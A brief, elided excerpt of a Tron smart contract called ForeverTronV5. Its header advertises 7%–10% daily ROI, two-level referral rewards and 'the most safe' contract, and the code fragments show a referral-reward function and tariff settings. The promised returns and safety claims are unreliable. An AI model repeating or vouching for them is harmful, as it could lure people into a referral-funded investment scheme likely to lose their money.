...
*  88P     d8P' ?88  88P'  
* d88      88b  d88 d88      
*d88'      `?8888P'd88' Ever Tron - Version 5 Official
*                                                         
*                                                        
* THE MOST SAFE AND STILL ATRACTIVE SMARTCONTRACT EVER
* 
* Crowdfunding And Investment Program: 7% - 10% Daily ROI. 
* 9% Referral Rewards 2 Levels
* 
* ForeverTronV5 Official
* https://ForeverTronV5.io
* 
* 
**/
contract ForeverTronV5  {
  ...
  function rewardReferers(uint amount, address referer) internal {
    ...
    tariffs.push(Tariff(20 * 28800, 140));
